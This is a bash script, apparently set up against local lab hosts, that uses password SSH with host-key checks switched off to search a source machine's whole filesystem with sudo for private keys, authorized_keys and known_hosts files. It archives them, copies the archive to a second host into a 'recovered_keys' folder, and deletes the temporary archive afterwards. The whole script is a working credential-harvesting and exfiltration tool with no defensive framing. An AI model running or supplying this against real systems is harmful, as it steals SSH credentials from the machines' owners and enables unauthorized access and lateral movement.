#!/bin/bash
set -euo pipefail

SRC_HOST="${1:-127.0.0.1}"
SRC_PORT="${2:-2222}"
SRC_USER="${3:-d33}"
SRC_PASS="${4:-d33}"

DST_HOST="${5:-127.0.0.1}"
DST_PORT="${6:-2223}"
DST_USER="${7:-d33}"
DST_PASS="${8:-d33}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STAGE_DIR="$SCRIPT_DIR/ssh_transfer"
ARCHIVE="collected_keys.tar.gz"
REMOTE_TMP="/tmp/$ARCHIVE"
DEST_DIR="/home/$DST_USER/recovered_keys"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10"

mkdir -p "$STAGE_DIR"

echo "[1/5] Searching $SRC_HOST:$SRC_PORT for SSH key material..."

DISCOVER_CMD='sudo find / -xdev -type f \
  \( -name "id_rsa*" -o -name "id_dsa*" -o -name "id_ecdsa*" -o -name "id_ed25519*" \
     -o -name "authorized_keys*" -o -name "known_hosts*" \
     -o -name "*.pem" -o -name "*.key" \) \
  -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
  -not -path "/etc/ssl/*" -not -path "/usr/share/*" -not -path "/usr/lib/*" \
  -not -path "/usr/local/lib/*" -not -path "/etc/hostapd*" \
  2>/dev/null | sort'

sshpass -p "$SRC_PASS" ssh $SSH_OPTS -p "$SRC_PORT" \
    "$SRC_USER@$SRC_HOST" "$DISCOVER_CMD" > "$STAGE_DIR/raw_scan.txt"

RAW_COUNT=$(wc -l < "$STAGE_DIR/raw_scan.txt")

sed -e 's/\r$//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' \
    "$STAGE_DIR/raw_scan.txt" | grep '^/' | sort -u > "$STAGE_DIR/found_keys.txt"

KEY_COUNT=$(wc -l < "$STAGE_DIR/found_keys.txt")
DROPPED=$((RAW_COUNT - KEY_COUNT))
echo "      Found $KEY_COUNT candidate files (dropped $DROPPED malformed lines):"
sed 's/^/        /' "$STAGE_DIR/found_keys.txt"

if [ "$KEY_COUNT" -eq 0 ]; then
    echo "No keys found. Nothing to transfer."
    exit 0
fi

echo "[2/5] Packing keys on the source host..."

sed 's|^/||' "$STAGE_DIR/found_keys.txt" > "$STAGE_DIR/rel_paths.txt"

sshpass -p "$SRC_PASS" scp $SSH_OPTS -P "$SRC_PORT" \
    "$STAGE_DIR/rel_paths.txt" "$SRC_USER@$SRC_HOST:/tmp/rel_paths.txt"

sshpass -p "$SRC_PASS" ssh $SSH_OPTS -p "$SRC_PORT" \
    "$SRC_USER@$SRC_HOST" "sudo tar -czf $REMOTE_TMP -C / -T /tmp/rel_paths.txt && rm -f /tmp/rel_paths.txt"

echo "[3/5] Retrieving $ARCHIVE from the source host..."

sshpass -p "$SRC_PASS" scp $SSH_OPTS -P "$SRC_PORT" \
    "$SRC_USER@$SRC_HOST:$REMOTE_TMP" "$STAGE_DIR/$ARCHIVE"

ARCHIVE_SIZE=$(du -h "$STAGE_DIR/$ARCHIVE" | cut -f1)
echo "      Retrieved ($ARCHIVE_SIZE)"

echo "[4/5] Uploading to $DST_HOST:$DST_PORT..."

sshpass -p "$DST_PASS" scp $SSH_OPTS -P "$DST_PORT" \
    "$STAGE_DIR/$ARCHIVE" "$DST_USER@$DST_HOST:/tmp/$ARCHIVE"

echo "[5/5] Extracting on the destination host..."

sshpass -p "$DST_PASS" ssh $SSH_OPTS -p "$DST_PORT" "$DST_USER@$DST_HOST" "
    sudo mkdir -p $DEST_DIR
    sudo tar -xzf /tmp/$ARCHIVE -C $DEST_DIR
    sudo chown -R $DST_USER:$DST_USER $DEST_DIR
    rm -f /tmp/$ARCHIVE
    echo 'Recovered files on destination:'
    find $DEST_DIR -type f -exec ls -la {} \;
"

sshpass -p "$SRC_PASS" ssh $SSH_OPTS -p "$SRC_PORT" \
    "$SRC_USER@$SRC_HOST" "sudo rm -f $REMOTE_TMP"

echo "Transfer complete."
